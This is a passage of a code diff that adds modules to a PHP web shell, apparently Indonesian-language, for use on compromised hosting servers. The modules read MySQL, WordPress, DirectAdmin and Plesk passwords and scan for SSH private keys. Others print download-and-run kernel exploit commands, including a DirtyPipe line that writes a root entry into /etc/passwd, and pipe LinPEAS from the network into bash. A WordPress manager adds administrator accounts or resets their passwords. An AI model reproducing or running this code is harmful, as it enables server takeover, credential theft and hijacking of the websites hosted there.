+            if($myCnf && preg_match('/password="?([^\s"\n]+)/',$myCnf,$m)) $panelInfo .= "[MySQL] root password: {$m[1]}\n";
+            $wpCreds = komenb('grep -h "DB_PASSWORD\|DB_USER" /home/'.$cu.'/public_html/wp-config.php /home/'.$cu.'/domains/*/public_html/wp-config.php 2>/dev/null | head -6', $lokasi);
+            if($wpCreds) $panelInfo .= "[MySQL] Found in wp-config:\n$wpCreds\n";
+            $daConf = @file_get_contents('/usr/local/directadmin/conf/admin.conf');
+            if($daConf && preg_match('/password=(.+)/',$daConf,$m)) $panelInfo .= "[DirectAdmin] admin password: {$m[1]}\n";
+            $pleskPass = trim(komenb('plesk admin --show-password 2>/dev/null', $lokasi));
+            if($pleskPass) $panelInfo .= "[Plesk] Admin password: $pleskPass\n";
+            if(!$hash && !$myCnf && !$wpCreds) $panelInfo .= "(No readable credentials found - run as root for full discovery)\n";
+        }
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo $panelInfo;
+        echo "</pre>";
+    }
+    die(author());
+}
+
+// ============================================================
+// 19. PLUGINS & SOFTWARE
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "plugins") {
+    echo "<center><h3>🔥 PLUGINS & SOFTWARE SCANNER</h3><hr>";
+    echo "<font color='#aaa'>Scan plugins, software, dan layanan yang terinstall</font><br><br>";
+    
+    echo '<form method="post">';
+    echo '<input type="submit" name="scan_plugins" value="🔍 Scan Plugins" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['scan_plugins'])) {
+        $pluginsList = [];
+        $isWin = strtoupper(substr(PHP_OS,0,3)) === 'WIN';
+        $pluginsList['Server'][] = ['name'=>'PHP','ver'=>phpversion(),'status'=>'Core','type'=>'Runtime'];
+        $pluginsList['Server'][] = ['name'=>$_SERVER['SERVER_SOFTWARE']??'Web Server','ver'=>'','status'=>'Active','type'=>'Web Server'];
+        if(ini_get('disable_functions')) $pluginsList['Server'][] = ['name'=>'Disabled Functions','ver'=>substr(str_replace(',',', ',ini_get('disable_functions')),0,80),'status'=>'⚠','type'=>''];
+        
+        if($isWin){
+            $mysql = trim(komenb('mysql --version 2>nul', $lokasi));
+            if($mysql){$__p=strpos($mysql,'MySQL');$pluginsList['Server'][] = ['name'=>'MySQL','ver'=>substr($mysql,$__p!==false?$__p:0,40),'status'=>'','type'=>'Database'];}
+        } else {
+            $mysql = trim(komenb('mysql --version 2>/dev/null | head -1', $lokasi));
+            if($mysql){$__p=strpos($mysql,'Distrib');$pluginsList['Server'][] = ['name'=>'MySQL/MariaDB','ver'=>substr($mysql,$__p!==false?$__p:0,20),'status'=>'','type'=>'Database'];}
+            $pg = trim(komenb('psql --version 2>/dev/null', $lokasi));
+            if($pg) $pluginsList['Server'][] = ['name'=>'PostgreSQL','ver'=>str_replace('psql (PostgreSQL) ','',$pg),'status'=>'','type'=>'Database'];
+        }
+        
+        $wpDirs = [];
+        if($isWin) { if(is_dir('C:\\xampp\\htdocs')) $wpDirs[] = 'C:\\xampp\\htdocs'; }
+        else { foreach(['/var/www','/home'] as $d) { if(is_dir($d)) $wpDirs[] = $d; } }
+        foreach($wpDirs as $wd){
+            $wps = trim(komenb('find '.$wd.' -maxdepth 4 -name wp-config.php -type f 2>/dev/null | head -5', $lokasi));
+            if(!$wps) continue;
+            foreach(explode("\n",$wps) as $wp){
+                $wpDir = dirname($wp);
+                if(!$wpDir || !is_dir($wpDir.'/wp-content/plugins')) continue;
+                $site = basename($wpDir);
+                $plugs = @scandir($wpDir.'/wp-content/plugins');
+                if(!$plugs) continue;
+                $cnt = 0;
+                foreach($plugs as $p){
+                    if($p[0]=='.' || !is_dir($wpDir.'/wp-content/plugins/'.$p)) continue;
+                    if(in_array($p,['akismet','hello'])) continue;
+                    $cnt++;
+                    $ver = '';
+                    $vf = $wpDir.'/wp-content/plugins/'.$p.'/'.$p.'.php';
+                    if(file_exists($vf)){ $c = file_get_contents($vf); if(preg_match('/Version:\s*([\d.]+)/',$c,$m)) $ver = $m[1]; }
+                    $pluginsList['WP: '.$site][] = ['name'=>$p,'ver'=>$ver,'status'=>'','type'=>'Plugin'];
+                }
+                $wvf = $wpDir.'/wp-includes/version.php';
+                if(file_exists($wvf)){ $c = file_get_contents($wvf); if(preg_match('/\$wp_version\s*=\s*\'([^\']+)/',$c,$m)) $pluginsList['WP: '.$site][] = ['name'=>'WordPress','ver'=>$m[1],'status'=>'Core','type'=>'Core']; }
+                $pluginsList['WP: '.$site][] = ['name'=>"({$cnt} plugins)",'ver'=>'','status'=>'','type'=>''];
+            }
+        }
+        
+        $secChecks = $isWin ? ['ESET'=>'sc query ekrn 2>nul','Windows Defender'=>'sc query WinDefend 2>nul']
+            : ['CSF/LFD'=>'which csf 2>/dev/null','UFW'=>'which ufw 2>/dev/null','Firewalld'=>'which firewall-cmd 2>/dev/null','ModSecurity'=>'which modsecurity 2>/dev/null','Imunify360'=>'which imunify360-agent 2>/dev/null','CageFS'=>'which cagefsctl 2>/dev/null','CloudLinux'=>'cat /etc/redhat-release 2>/dev/null | grep -i cloudlinux'];
+        foreach($secChecks as $name=>$check){
+            $r = trim(komenb($check, $lokasi));
+            if($r) $pluginsList['Security'][] = ['name'=>$name,'ver'=>'','status'=>'Installed','type'=>'Firewall/AV'];
+        }
+        
+        $cacheChecks = $isWin ? [] : ['Redis'=>'which redis-server 2>/dev/null','Memcached'=>'which memcached 2>/dev/null','Varnish'=>'which varnishd 2>/dev/null','NGINX'=>'which nginx 2>/dev/null'];
+        foreach($cacheChecks as $name=>$check){
+            $r = trim(komenb($check, $lokasi));
+            if($r) $pluginsList['Cache'][] = ['name'=>$name,'ver'=>'','status'=>'Installed','type'=>'Cache'];
+        }
+        
+        $panelChecks = ['Plesk'=>'plesk version 2>/dev/null','cPanel'=>'cat /usr/local/cpanel/version 2>/dev/null','CWP'=>'ls /usr/local/cwp/php71/bin/php 2>/dev/null','Hostinger'=>'ls /usr/local/hpanel 2>/dev/null','LiteSpeed'=>'which lsws 2>/dev/null'];
+        foreach($panelChecks as $name=>$check){
+            $r = trim(komenb($check, $lokasi));
+            if($r) $pluginsList['Panel'][] = ['name'=>$name,'ver'=>substr($r,0,30),'status'=>'Installed','type'=>'Panel'];
+        }
+        
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo "═══ PLUGINS & SOFTWARE ═══\n\n";
+        foreach($pluginsList as $category=>$items){
+            echo "[$category]\n";
+            foreach($items as $it){
+                echo "  {$it['name']}" . ($it['ver'] ? " ({$it['ver']})" : "") . ($it['status'] ? " [{$it['status']}]" : "") . "\n";
+            }
+            echo "\n";
+        }
+        echo "</pre>";
+    }
+    die(author());
+}
+
+// ============================================================
+// 20. KERNEL EXPLOIT SUGGESTER
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "kernel") {
+    echo "<center><h3>🔥 KERNEL EXPLOIT SUGGESTER</h3><hr>";
+    echo "<font color='#aaa'>Cari exploit untuk kernel saat ini</font><br><br>";
+    
+    echo '<form method="post">';
+    echo '<input type="submit" name="kernel_scan" value="🔍 Scan Kernel" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['kernel_scan'])) {
+        $kver = komenb('uname -r 2>/dev/null', $lokasi);
+        $scanCikti = "=== KERNEL ANALYSIS ===\n\n";
+        $scanCikti .= "Kernel: " . trim($kver) . "\n";
+        $scanCikti .= "OS: " . trim(komenb('cat /etc/os-release 2>/dev/null | head -2', $lokasi)) . "\n\n";
+        $scanCikti .= "--- Suggested Exploits ---\n\n";
+        
+        $k = trim($kver);
+        if(strpos($k,'2.6.')!==false||strpos($k,'2.6')!==false){
+            $scanCikti .= "🔥 DirtyCow (CVE-2016-5195) - Kernel 2.6\n  wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c\n  gcc dirty.c -o dirty -lpthread && ./dirty\n\n";
+        }
+        if(strpos($k,'3.')!==false){
+            $scanCikti .= "🔥 overlayfs (CVE-2015-1328) - Kernel 3.x\n  wget https://raw.githubusercontent.com/xl7dev/Exploit/master/Linux/linux_overlayfs_privesc.c\n  gcc linux_overlayfs_privesc.c -o overlay && ./overlay\n\n";
+        }
+        if(strpos($k,'4.')!==false){
+            $scanCikti .= "🔥 PwnKit (CVE-2021-4034) - Kernel 4.x\n  curl -fsSL https://github.com/ly4k/PwnKit/raw/main/PwnKit -o /tmp/pwn && chmod 777 /tmp/pwn && /tmp/pwn id\n\n";
+        }
+        if(strpos($k,'5.4')!==false||strpos($k,'5.5')!==false||strpos($k,'5.6')!==false||strpos($k,'5.7')!==false){
+            $scanCikti .= "🔥 DirtyPipe (CVE-2022-0847) - Kernel 5.4-5.7\n  curl -fsSL https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c -o /tmp/dp.c\n  gcc -std=c99 /tmp/dp.c -o /tmp/dp && /tmp/dp /etc/passwd 1 'r00t::0:0:root:/root:/bin/bash'\n\n";
+        }
+        if(strpos($k,'5.8')!==false||strpos($k,'5.9')!==false||strpos($k,'5.10')!==false||strpos($k,'5.11')!==false||strpos($k,'5.12')!==false||strpos($k,'5.13')!==false||strpos($k,'5.14')!==false||strpos($k,'5.15')!==false||strpos($k,'5.16')!==false){
+            $scanCikti .= "🔥 DirtyPipe (CVE-2022-0847) - Kernel 5.8-5.16\n  curl -fsSL https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c -o /tmp/dp.c\n  gcc -std=c99 /tmp/dp.c -o /tmp/dp && /tmp/dp /etc/passwd 1 'r00t::0:0:root:/root:/bin/bash'\n\n";
+        }
+        if(strpos($k,'6.')!==false){
+            $scanCikti .= "🔥 CVE-2026-46300 - Kernel 6.x\n  git clone https://github.com/ExploitEoom/CVE-2026-46300.git /tmp/cve && cd /tmp/cve && chmod +x exploit && ./exploit\n";
+            $scanCikti .= "🔥 CVE-2026-41651 (PackageKit)\n  git clone https://github.com/Vozec/CVE-2026-41651.git /tmp/cve2 && cd /tmp/cve2 && chmod +x cve-2026-41651 && ./cve-2026-41651\n";
+        }
+        
+        $scanCikti .= "\n--- Manual Checks ---\n";
+        $scanCikti .= "► SUID Binary: find / -perm -4000 -type f 2>/dev/null | head -10\n";
+        $scanCikti .= "► Sudoers: sudo -l 2>/dev/null || cat /etc/sudoers 2>/dev/null\n";
+        $scanCikti .= "► Writable passwd: ls -la /etc/passwd\n";
+        $scanCikti .= "► Docker: docker ps 2>/dev/null || echo 'Docker not found'\n";
+        
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo $scanCikti;
+        echo "</pre>";
+    }
+    die(author());
+}
+
+// ============================================================
+// 21. LINUX SCAN
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "lscan") {
+    echo "<center><h3>🔥 LINUX SECURITY SCAN</h3><hr>";
+    echo "<font color='#aaa'>Scan keamanan Linux (SUID, Sudo, Cron, Capabilities, dll)</font><br><br>";
+    
+    echo '<form method="post">';
+    echo '<input type="submit" name="linux_scan" value="🔍 Scan Linux" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['linux_scan'])) {
+        $isWin = strtoupper(substr(PHP_OS,0,3)) === 'WIN';
+        $linuxScanOut = "══════════════════════════════════════════\n        LINUX SECURITY SCAN\n══════════════════════════════════════════\n\n";
+        if($isWin){ $linuxScanOut .= "Not a Linux system.\n"; }
+        else {
+            $linuxScanOut .= "KERNEL: " . trim(komenb('uname -r 2>/dev/null', $lokasi)) . "\n";
+            $linuxScanOut .= "OS: " . trim(komenb('cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d "\""', $lokasi)) . "\n";
+            $linuxScanOut .= "USER: " . trim(komenb('whoami 2>/dev/null', $lokasi)) . " | ID: " . trim(komenb('id 2>/dev/null', $lokasi)) . "\n\n";
+
+            $linuxScanOut .= "[1] SUID BINARIES\n";
+            $suid = komenb('find / -perm -4000 -type f 2>/dev/null | head -20', $lokasi);
+            $linuxScanOut .= ($suid ? $suid : "  (none found)") . "\n\n";
+
+            $linuxScanOut .= "[2] SUDO -l\n";
+            $sudo = komenb('sudo -l 2>/dev/null', $lokasi);
+            $linuxScanOut .= ($sudo ? $sudo : "  (not available)") . "\n\n";
+
+            $linuxScanOut .= "[3] CRON JOBS\n";
+            $cron = komenb('ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /var/spool/cron/ 2>/dev/null', $lokasi);
+            $linuxScanOut .= ($cron ? $cron : "  (none)") . "\n";
+            $writableCron = komenb('find /etc/cron* -writable -type f 2>/dev/null | head -10', $lokasi);
+            if($writableCron) $linuxScanOut .= "  ⚠ WRITABLE: $writableCron\n";
+            $linuxScanOut .= "\n";
+
+            $linuxScanOut .= "[4] CAPABILITIES (getcap)\n";
+            $caps = komenb('getcap -r / 2>/dev/null | grep -v "usr/share" | head -20', $lokasi);
+            $linuxScanOut .= ($caps ? $caps : "  (none or getcap not installed)") . "\n\n";
+
+            $linuxScanOut .= "[5] WRITABLE CHECKS\n";
+            $wp = komenb('ls -la /etc/passwd 2>/dev/null | grep "^-rw-rw"', $lokasi);
+            $ws = komenb('ls -la /etc/shadow 2>/dev/null | grep "^-rw-rw"', $lokasi);
+            if($wp) $linuxScanOut .= "  ⚠ /etc/passwd is writable!\n";
+            if($ws) $linuxScanOut .= "  ⚠ /etc/shadow is writable!\n";
+            if(!$wp && !$ws) $linuxScanOut .= "  passwd/shadow: OK\n";
+            $wdir = komenb('find / -writable -type d 2>/dev/null | grep -v "^/proc" | grep -v "^/sys" | grep -v "^/dev" | head -10', $lokasi);
+            if($wdir) $linuxScanOut .= "  Writable dirs: $wdir\n";
+            $linuxScanOut .= "\n";
+
+            $linuxScanOut .= "[6] CONTAINER CHECKS\n";
+            $docker = komenb('docker ps 2>/dev/null', $lokasi);
+            $lxc = komenb('lxc list 2>/dev/null', $lokasi);
+            $dockersock = @is_readable('/var/run/docker.sock') ? "  ⚠ docker.sock readable!" : "  docker.sock: not readable";
+            $cgroup = komenb('cat /proc/1/cgroup 2>/dev/null | grep -i "docker\|lxc\|kubepod" | head -5', $lokasi);
+            if($docker) $linuxScanOut .= "  docker: $docker\n";
+            if($lxc) $linuxScanOut .= "  lxc: $lxc\n";
+            $linuxScanOut .= "  $dockersock\n";
+            if($cgroup) $linuxScanOut .= "  Container env: $cgroup\n";
+            $linuxScanOut .= "\n";
+
+            $linuxScanOut .= "[7] NETWORK & PROCESSES\n";
+            $rootProc = komenb('ps aux 2>/dev/null | grep "^root" | head -15', $lokasi);
+            if($rootProc) $linuxScanOut .= "  Root processes: $rootProc\n";
+            $ports = komenb('ss -tlnp 2>/dev/null | head -20', $lokasi);
+            if($ports) $linuxScanOut .= "  Listening ports:\n$ports\n";
+            $linuxScanOut .= "\n═══════════════════════════\n";
+        }
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo $linuxScanOut;
+        echo "</pre>";
+    }
+    die(author());
+}
+
+// ============================================================
+// 22. SSH KEY SCANNER
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "sshscan") {
+    echo "<center><h3>🔥 SSH KEY SCANNER</h3><hr>";
+    echo "<font color='#aaa'>Cari SSH private keys dan authorized_keys</font><br><br>";
+    
+    echo '<form method="post">';
+    echo '<input type="submit" name="ssh_scan" value="🔍 Scan SSH Keys" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['ssh_scan'])) {
+        $scanCikti = "=== SSH KEY SCAN ===\n\n";
+        $keys = komenb('find /root /home /etc/ssh /tmp /var/tmp /opt \( -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" \) 2>/dev/null | grep -v "/usr/share/" | head -20', $lokasi);
+        $auth = komenb('find / -name "authorized_keys" 2>/dev/null | head -10', $lokasi);
+        $configs = komenb('cat /etc/ssh/sshd_config 2>/dev/null | grep -E "PermitRoot|PasswordAuth|Port "', $lokasi);
+        
+        if(trim($keys)){
+            $scanCikti .= "--- Private Keys ---\n" . $keys . "\n\n"; 
+            $scanCikti .= "Usage: cat <path> to view key content, then use with ssh -i\n\n";
+        }
+        if(trim($auth)){
+            $scanCikti .= "--- authorized_keys ---\n" . $auth . "\n\n"; 
+        }
+        if(trim($configs)){
+            $scanCikti .= "--- SSH Configuration ---\n" . $configs . "\n\n"; 
+            if(strpos($configs,'PermitRootLogin yes')!==false){
+                $scanCikti .= "WARNING: Root login is ENABLED\n";
+            }
+        }
+        if(!trim($keys) && !trim($auth)){
+            $scanCikti .= "No SSH keys found.\n"; 
+        }
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo $scanCikti;
+        echo "</pre>";
+    }
+    die(author());
+}
+
+// ============================================================
+// 23. WINDOWS ANALYZER
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "winscan") {
+    echo "<center><h3>🔥 WINDOWS ANALYSIS</h3><hr>";
+    echo "<font color='#aaa'>Analisis keamanan Windows (systeminfo, patches, privileges, dll)</font><br><br>";
+    
+    echo '<form method="post">';
+    echo '<input type="submit" name="win_scan" value="🔍 Scan Windows" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['win_scan'])) {
+        $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+        $winCikti = "=== WINDOWS ANALYSIS ===\n\n";
+        if($isWin){
+            $winCikti .= "Hostname: " . trim(komenb('hostname 2>nul', $lokasi)) . "\n";
+            $winCikti .= "User: " . trim(komenb('whoami 2>nul', $lokasi)) . "\n";
+            $winCikti .= "Domain: " . trim(komenb('echo %userdomain% 2>nul', $lokasi)) . "\n\n";
+
+            $winCikti .= "--- System Info ---\n";
+            $si = komenb('systeminfo 2>nul | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Total Physical Memory" /C:"Hotfix" /C:"Registered"', $lokasi);
+            $winCikti .= ($si ? $si : "(systeminfo unavailable)") . "\n\n";
+
+            $winCikti .= "--- Installed Patches ---\n";
+            $hf = komenb('wmic qfe get HotFixID,Description,InstalledOn 2>nul | findstr /V "Description"', $lokasi);
+            $winCikti .= ($hf ? $hf : "(wmic unavailable)") . "\n\n";
+
+            $winCikti .= "--- Privileges (whoami /priv) ---\n";
+            $privs = komenb('whoami /priv 2>nul', $lokasi);
+            $winCikti .= ($privs ? $privs : "(unavailable)") . "\n\n";
+
+            $winCikti .= "--- Local Users ---\n";
+            $users = komenb('net user 2>nul | findstr /V "command completed successfully"', $lokasi);
+            $winCikti .= ($users ? $users : "(unavailable)") . "\n\n";
+
+            $winCikti .= "--- Local Administrators ---\n";
+            $admins = komenb('net localgroup Administrators 2>nul | findstr /V "command completed successfully" | findstr /V "Alias" | findstr /V "Comment" | findstr /V "Members"', $lokasi);
+            $winCikti .= ($admins ? $admins : "(unavailable)") . "\n\n";
+
+            $winCikti .= "--- Running Services ---\n";
+            $svcs = komenb('sc query type= service state= running 2>nul | findstr /B /C:"SERVICE_NAME" /C:"DISPLAY_NAME"', $lokasi);
+            $winCikti .= ($svcs ? $svcs : "(sc query unavailable)") . "\n\n";
+
+            $wv = strtolower(komenb('ver 2>nul', $lokasi));
+            $build = '';
+            if(preg_match('/10\.0\.(\d+)/', $wv, $m)) $build = $m[1];
+
+            $winCikti .= "--- Privilege Escalation Checks ---\n";
+            if($build && intval($build) >= 14393 && intval($build) <= 19045){
+                $winCikti .= "[CVE-2024-26234] Windows 10/11 - Pkinit\n";
+            }
+            $winCikti .= "[AlwaysInstallElevated] reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n";
+            $winCikti .= "[Unquoted Paths] wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\"\n";
+            $winCikti .= "[SeImpersonate] whoami /priv | findstr SeImpersonatePrivilege\n";
+            $winCikti .= "[SeBackup] whoami /priv | findstr SeBackupPrivilege\n";
+            $winCikti .= "[Credential Manager] cmdkey /list\n";
+            $winCikti .= "[Saved RDP] reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s\n";
+            $winCikti .= "[AppLocker] powershell -c \"Get-AppLockerPolicy -Effective | select -exp RuleCollections\"\n";
+        } else {
+            $winCikti .= "Current system is not Windows. Run on a Windows target.\n";
+        }
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo $winCikti;
+        echo "</pre>";
+    }
+    die(author());
+}
+
+// ============================================================
+// 24. DOMAIN SCANNER
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "domain") {
+    echo "<center><h3>🔥 DOMAIN SCANNER</h3><hr>";
+    echo "<font color='#aaa'>Scan domain yang terdaftar di server</font><br><br>";
+    
+    echo '<form method="post">';
+    echo '<input type="submit" name="domain_scan" value="🔍 Scan Domains" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['domain_scan'])) {
+        $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+        $domainList = [];
+        $panel = 'Unknown';
+        $shellWorks = true;
+        $whoamiCached = trim(komenb('whoami 2>/dev/null', $lokasi));
+
+        $test = trim(komenb('echo test123 2>/dev/null', $lokasi));
+        if($test !== 'test123'){ $shellWorks = false; }
+
+        if(!$isWin && $shellWorks){
+            $r = trim(komenb('cat /etc/localdomains 2>/dev/null | head -50', $lokasi));
+            if($r){ $panel='cPanel'; foreach(explode("\n",$r) as $l){ $l=trim($l); if($l && preg_match('/\./',$l) && !isset($domainList[$l])) $domainList[$l]=['name'=>$l,'path'=>'/etc/localdomains','type'=>'cPanel','url'=>$l]; } }
+            if(empty($domainList)){
+                $r = trim(komenb('grep -l "ServerName" /etc/httpd/conf.d/*.conf 2>/dev/null | head -50', $lokasi));
+                $r2 = trim(komenb('ls /home/ 2>/dev/null | head -20', $lokasi));
+                if($r || $r2){ $panel='CWP'; }
+            }
+            if(empty($domainList)){
+                $r = trim(komenb('plesk bin site --list 2>/dev/null', $lokasi));
+                if($r){ $panel='Plesk'; foreach(explode("\n",$r) as $l){ $l=trim($l); if($l && preg_match('/\./',$l) && !isset($domainList[$l])) $domainList[$l]=['name'=>$l,'path'=>'Plesk','type'=>'Plesk','url'=>$l]; } }
+            }
+            if(empty($domainList)){
+                $r = trim(komenb('grep -rh "ServerName" /etc/httpd/conf/httpd.conf /etc/httpd/conf.d/ /etc/apache2/sites-enabled/ /etc/apache2/sites-available/ /etc/apache2/httpd.conf 2>/dev/null | grep -v "^#" | grep -i "ServerName" | awk \'{print $2}\' | grep "\\." | head -50', $lokasi));
+                if($r){ $panel='Apache'; foreach(explode("\n",$r) as $l){ $l=trim($l); $l=preg_replace('/:\d+$/','',$l); if($l && preg_match('/\./',$l) && !preg_match('/^(localhost|_|[\d\.]+)$/i',$l) && !isset($domainList[$l])) $domainList[$l]=['name'=>$l,'path'=>'Apache','type'=>'Apache','url'=>$l]; } }
+            }
+            if(empty($domainList) && is_dir('/usr/local/vesta')){
+                $r = trim(komenb('for u in $(grep ":" /etc/passwd | cut -f1 -d:); do if [ -f "/usr/local/vesta/data/users/$u/user.conf" ]; then /usr/local/vesta/bin/v-list-web-domains $u plain 2>/dev/null | cut -f1; fi; done', $lokasi));
+                if($r){ $panel='VestaCP'; foreach(explode("\n",$r) as $l){ $l=trim($l); if($l && preg_match('/\./',$l) && !isset($domainList[$l])) $domainList[$l]=['name'=>$l,'path'=>'VestaCP','type'=>'VestaCP','url'=>$l]; } }
+            }
+        }
+        if($isWin && $shellWorks){
+            $r = trim(komenb('appcmd list site /text:name 2>nul', $lokasi));
+            if($r){ $panel='IIS'; foreach(explode("\n",$r) as $l){ $l=trim($l); if($l && !isset($domainList[$l])) $domainList[$l]=['name'=>$l,'path'=>'IIS','type'=>'IIS','url'=>$l]; } }
+        }
+
+        $domainCikti = 'Panel: ' . $panel . '  |  Domains: ' . count($domainList) . "\n";
+        $domainCikti .= str_repeat('─', 70) . "\n";
+        foreach($domainList as $k=>$d){
+            $domainCikti .= sprintf("%-30s %-30s %s [%s]", $k, $d['path']??'-', $d['url'] ?: '-', 'Read') . "\n";
+        }
+        $domainCikti .= str_repeat('─', 70) . "\nTotal: " . count($domainList) . "\n";
+        
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo $domainCikti;
+        echo "</pre>";
+    }
+    die(author());
+}
+
+// ============================================================
+// 25. LINPEAS
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "linpeas") {
+    echo "<center><h3>🔥 LINPEAS</h3><hr>";
+    echo "<font color='#aaa'>Jalankan LinPEAS untuk privilege escalation</font><br><br>";
+    
+    echo '<form method="post">';
+    echo '<input type="submit" name="run_linpeas" value="🚀 Run LinPEAS" class="up" style="cursor:pointer;">';
+    echo '</form>';
+    
+    if (isset($_POST['run_linpeas'])) {
+        echo "<br><pre style='text-align:left;background:#0a0a0a;padding:15px;border-radius:4px;max-height:500px;overflow:auto;'>";
+        echo "[+] Running LinPEAS...\n\n";
+        echo komend("curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | head -200", $lokasi);
+        echo "\n[!] Gunakan terminal untuk output lengkap:\n";
+        echo "  curl -sL raw.githubusercontent.com/peass-ng/PEASS-ng/master/linpeas/linpeas.sh | bash\n";
+        echo "</pre>";
+    }
+    die(author());
+}
+
+// ============================================================
+// 26. WP MANAGER
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "wp") {
+    echo "<center><h3>🔥 WORDPRESS MANAGER</h3><hr>";
+    echo "<font color='#aaa'>Manage WordPress users (add, reset password, delete)</font><br><br>";
+    
+    $wp_config_path = '';
+    $wpDirs = ['/var/www','/home','/home/*/public_html','/home/*/domains/*/public_html'];
+    foreach($wpDirs as $wd){
+        $found = trim(komenb('find '.$wd.' -maxdepth 4 -name wp-config.php -type f 2>/dev/null | head -3', $lokasi));
+        if($found){
+            $wp_config_path = explode("\n", $found)[0];
+            break;
+        }
+    }
+    
+    if(!$wp_config_path && file_exists($lokasi.'/wp-config.php')){
+        $wp_config_path = $lokasi.'/wp-config.php';
+    }
+    
+    if($wp_config_path && file_exists($wp_config_path)){
+        echo "✅ WP Config ditemukan: <gold>" . $wp_config_path . "</gold><br><br>";
+        require_once($wp_config_path);
+        if(defined('DB_HOST') && defined('DB_NAME')){
+            $ms = @new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+            if(!$ms->connect_errno){
+                $tp = isset($table_prefix) ? $table_prefix : 'wp_';
+                $tbl = $tp.'users';
+                $mt = $tp.'usermeta';
+                
+                echo '<form method="post" style="display:inline-block;vertical-align:top;margin-right:20px;">';
+                echo '<b>Tambah User:</b><br>';
+                echo 'Username: <input type="text" name="kadi" class="up"><br>';
+                echo 'Password: <input type="text" name="sifre2" class="up"><br>';
+                echo 'Email: <input type="text" name="mail" class="up"><br>';
+                echo '<input type="hidden" name="wp_action" value="ekle">';
+                echo '<input type="submit" value="➕ Add Admin" class="up" style="cursor:pointer;">';
+                echo '</form>';
+                
+                echo '<form method="post" style="display:inline-block;vertical-align:top;">';
+                echo '<b>Reset Password:</b><br>';
+                echo 'User ID: <input type="text" name="id" class="up" placeholder="ID"><br>';
+                echo 'New Pass: <input type="text" name="sifre" class="up"><br>';
+                echo '<input type="hidden" name="wp_action" value="sifirla">';
+                echo '<input type="submit" value="🔑 Reset" class="up" style="cursor:pointer;">';
+                echo '</form>';
+                
+                echo '<form method="post" style="display:inline-block;vertical-align:top;">';
+                echo '<b>Hapus User:</b><br>';
+                echo 'User ID: <input type="text" name="id" class="up" placeholder="ID"><br>';
+                echo '<input type="hidden" name="wp_action" value="sil">';
+                echo '<input type="submit" value="🗑️ Delete" class="up" style="cursor:pointer;" onclick="return confirm(\'Hapus user?\')">';
+                echo '</form><br><br>';
+                
+                $result = $ms->query("SELECT ID,user_login,user_email,user_registered FROM $tbl ORDER BY ID");
+                if($result){
+                    echo "<table border='0' cellpadding='3' style='width:100%;text-align:left;'>";
+                    echo "<tr style='background:#1a1a1a;'><th>ID</th><th>Username</th><th>Email</th><th>Registered</th></tr>";
+                    while($row = $result->fetch_assoc()){
+                        echo "<tr><td>{$row['ID']}</td><td>{$row['user_login']}</td><td>{$row['user_email']}</td><td>{$row['user_registered']}</td></tr>";
+                    }
+                    echo "</table>";
+                }
+                $ms->close();
+            } else {
+                echo "❌ Database connection failed: " . $ms->connect_error . "<br>";
+            }
+        }
+    } else {
+        echo "❌ WordPress tidak ditemukan di path ini.<br>";
+        echo "Coba cari di: <br>";
+        echo '<form method="get" action="' . $_SERVER['SCRIPT_NAME'] . '">';
+        echo 'Path: <input type="text" name="wp_path" class="up" placeholder="/home/user/public_html">';
+        echo '<input type="hidden" name="loknya" value="' . $lokasi . '">';
+        echo '<input type="hidden" name="opsi" value="wp">';
+        echo '<input type="submit" value="Cari" class="up" style="cursor:pointer;">';
+        echo '</form>';
+    }
+    die(author());
+}
+
+// ============================================================
+// HANDLER ASLI (Edit, Delete, Rename, Chmod, dll)
+// ============================================================
+if (isset($_GET['lokasie'])) {
+	echo "<tr><td>Current Fi"."le : ".$_GET['lokasie'];
+	echo '</tr></td></table><br/>';
